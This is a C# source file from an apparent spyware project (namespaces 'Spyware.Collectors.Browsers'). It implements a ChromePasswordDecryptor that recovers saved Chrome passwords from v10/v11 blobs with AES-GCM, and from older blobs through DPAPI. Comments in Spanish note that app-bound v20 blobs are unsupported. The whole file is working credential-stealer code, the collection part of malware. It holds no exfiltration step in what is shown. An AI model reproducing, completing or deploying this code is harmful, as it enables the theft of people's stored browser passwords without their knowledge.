using System.Security.Cryptography;
using System.Text;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Security;

namespace Spyware.Collectors.Browsers;

public readonly record struct CredentialOutcome(string? Password, string Status, string? FailureReason);

public static class ChromePasswordDecryptor
{
    private const int NonceLength = 12;
    private const int TagLength = 16;

    public static CredentialOutcome Decrypt(byte[]? blob, byte[]? aesKey, ILog log)
    {
        if (blob is null || blob.Length == 0)
            return new CredentialOutcome(null, CredentialStatus.Corrupted, "empty_blob");

        string prefix = blob.Length >= 3 ? Encoding.ASCII.GetString(blob, 0, 3) : string.Empty;

        switch (prefix)
        {
            case "v10":
            case "v11":
                if (aesKey is null || aesKey.Length != 32)
                    return new CredentialOutcome(null, CredentialStatus.EncryptedOnly, "aes_key_unavailable");

                return TryAesGcm(blob, aesKey);

            case "v20":
                // App-Bound Encryption: lectura posible, descifrado restringido.
                return new CredentialOutcome(null, CredentialStatus.Unsupported, "app_bound_v20");

            default:
                // Versiones antiguas: el blob era DPAPI directo.
                if (DpapiHelper.TryUnprotectToString(blob, out string legacy))
                    return new CredentialOutcome(legacy, CredentialStatus.Decrypted, null);

                return new CredentialOutcome(null, CredentialStatus.EncryptedOnly, "dpapi_denied");
        }
    }

    private static CredentialOutcome TryAesGcm(byte[] blob, byte[] aesKey)
    {
        if (blob.Length < 3 + NonceLength + TagLength)
            return new CredentialOutcome(null, CredentialStatus.Corrupted, "blob_too_short");

        try
        {
            byte[] nonce = blob[3..(3 + NonceLength)];
            byte[] tag = blob[^TagLength..];
            byte[] cipherText = blob[(3 + NonceLength)..^TagLength];
            byte[] plain = new byte[cipherText.Length];

            // .NET 8: el tag se pasa separado (el helper conceptual del plan usaba la
            // firma antigua con ciphertext+tag concatenados).
            using var aes = new AesGcm(aesKey, TagLength);
            aes.Decrypt(nonce, cipherText, tag, plain);

            string password = Encoding.UTF8.GetString(plain).TrimEnd('\0');
            return new CredentialOutcome(password, CredentialStatus.Decrypted, null);
        }
        catch (CryptographicException)
        {
            return new CredentialOutcome(null, CredentialStatus.EncryptedOnly, "gcm_tag_mismatch");
        }
        catch (Exception ex)
        {
            return new CredentialOutcome(null, CredentialStatus.Corrupted, ex.GetType().Name);
        }
    }
}
